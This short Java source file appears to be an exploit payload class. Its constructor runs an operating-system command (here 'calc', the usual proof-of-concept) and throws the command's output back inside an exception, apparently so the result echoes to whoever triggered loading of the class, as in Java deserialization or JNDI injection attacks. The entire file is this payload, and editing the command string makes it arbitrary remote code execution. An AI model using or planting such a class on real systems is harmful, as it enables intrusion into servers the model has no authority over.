
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ExportObject {
    public ExportObject() throws Exception {
        Process proc = Runtime.getRuntime().exec("calc");
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer sb = new StringBuffer();

        String line;
        while((line = br.readLine()) != null) {
            sb.append(line).append("\n");
        }

        String result = sb.toString();
        Exception e = new Exception(result);
        throw e;
    }

    public static void main(String[] args) throws Exception {
    }
}
